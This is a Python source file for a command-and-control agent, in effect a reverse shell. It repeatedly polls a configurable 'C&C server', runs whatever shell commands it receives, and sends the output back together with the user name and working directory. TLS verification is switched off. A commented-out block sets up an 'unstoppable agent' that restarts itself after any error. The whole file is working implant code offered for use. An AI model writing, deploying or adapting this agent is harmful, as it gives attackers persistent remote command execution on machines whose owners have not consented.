#!/usr/bin/env python3
import getpass
import os
import sys
from subprocess import getoutput as execute
from time import sleep

from requests import Session

DEFAULT_HOSTNAME = 'https://localhost'


def get_arguments():
    from argparse import ArgumentParser

    parser = ArgumentParser()
    parser.add_argument('--hostname',
                        dest='hostname',
                        default=DEFAULT_HOSTNAME,
                        required=False,
                        help='Hostname of the C&C server')
    options = parser.parse_args()

    return options


options = get_arguments()

DEFAULT_SLEEP_TIMER_IN_SECONDS = 5


def send_command_output_to_server(session, shell_uuid, body_message, url):
    try:
        resp = session.post(url, json=body_message)
        status_code = resp.status_code
        if status_code == 200:
            print('[{uuid}] Command has been received'.format(uuid=shell_uuid))
        else:
            print('[{uuid}] Unexpected status code: {status_code}'.format(status_code=status_code,
                                                                          uuid=shell_uuid))
            print(resp.text)
    except Exception as e:
        print('[{uuid}] Unexpected error: {error}'.format(error=e, uuid=shell_uuid))


def execute_command(command, current_work_dir=None):
    try:
        command_as_array = command.split(' ')
        if 'cd' == command_as_array[0] and len(command_as_array) == 2:
            os.chdir(command_as_array[1])
            result = ''
        else:
            if current_work_dir:
                os.chdir(current_work_dir)
            result = execute(command)
    except Exception as e:
        result = str(e)
    encoding = sys.getdefaultencoding()
    user = getpass.getuser()
    current_work_dir = os.getcwd()
    if type(result) == bytes:
        result = result.decode(encoding, 'ignore')
    return {
        "user": user,
        "pwd": current_work_dir,
        "encoding": encoding,
        "data": result
    }


def receive_command(shell_uuid,
                    session,
                    url):
    print('[{uuid}] Receiving last requested command from the server'.format(uuid=shell_uuid))
    try:
        resp = session.get(url)
        status_code = resp.status_code
        if status_code == 200:
            print('[{uuid}] Last command received'.format(uuid=shell_uuid))
            data = resp.json()
            current_work_dir = data['cwd']
            command = data['cmd']
            print('CMD: {cmd}'.format(cmd=command))
            print('CWD: {cwd}'.format(cwd=current_work_dir))
            return {
                'command': command,
                'current_work_dir': current_work_dir
            }
        else:
            print('[{uuid}] Unsuccessful status code: {status_code}'.format(status_code=status_code, uuid=shell_uuid))
            print(resp.text)
    except Exception as e:
        print('[{uuid}] Unexpected error: {error}'.format(error=e, uuid=shell_uuid))


def get_shell_uuid(session,
                   url,
                   sleep_timer_in_secods=DEFAULT_SLEEP_TIMER_IN_SECONDS):
    print('GET {url}'.format(url=url))
    try:
        resp = session.get(url)
        status_code = resp.status_code
        if status_code == 200:
            print('New command session opened'.format())
            print(resp.text)
            return resp.json()
        else:
            print('Unsuccessful status code: {status_code}'.format(status_code=status_code))
            print(resp.text)
            print('Retrying in {seconds} seconds'.format(seconds=sleep_timer_in_secods))
            sleep(sleep_timer_in_secods)
            return get_shell_uuid(session, url, sleep_timer_in_secods)
    except Exception as e:
        print('Unexpected error: {error}'.format(error=e))
        print('Retrying in {seconds} seconds'.format(seconds=sleep_timer_in_secods))
        sleep(sleep_timer_in_secods)
        return get_shell_uuid(session, url, sleep_timer_in_secods)


def communicate_with_command_center(options):
    hostname = options.hostname
    with Session() as session:
        session.verify = False
        while True:
            base_url = '{hostname}'.format(hostname=hostname)
            shell_uuid = get_shell_uuid(session, "{base_url}/init".format(base_url=base_url))
            while True:
                shell_url = "{base_url}/{shell_uuid}".format(base_url=base_url, shell_uuid=shell_uuid)
                command_from_control_center = receive_command(shell_uuid, session, shell_url)
                if command_from_control_center:
                    last_command = command_from_control_center['command']
                    current_work_dir = command_from_control_center['current_work_dir']
                    if last_command:
                        result = execute_command(last_command, current_work_dir=current_work_dir)
                        if result:
                            send_command_output_to_server(session, shell_uuid, result, shell_url)
                        else:
                            sleep(DEFAULT_SLEEP_TIMER_IN_SECONDS)
                            break
                else:
                    sleep(DEFAULT_SLEEP_TIMER_IN_SECONDS)
                    break


communicate_with_command_center(options)
### uncomment this when you need an unstoppable agent
# try:
#     communicate_with_command_center(options)
# except:
#     # try to restart the agent in case of any error
#     Popen([sys.argv[0], "--hostname", options.hostname])
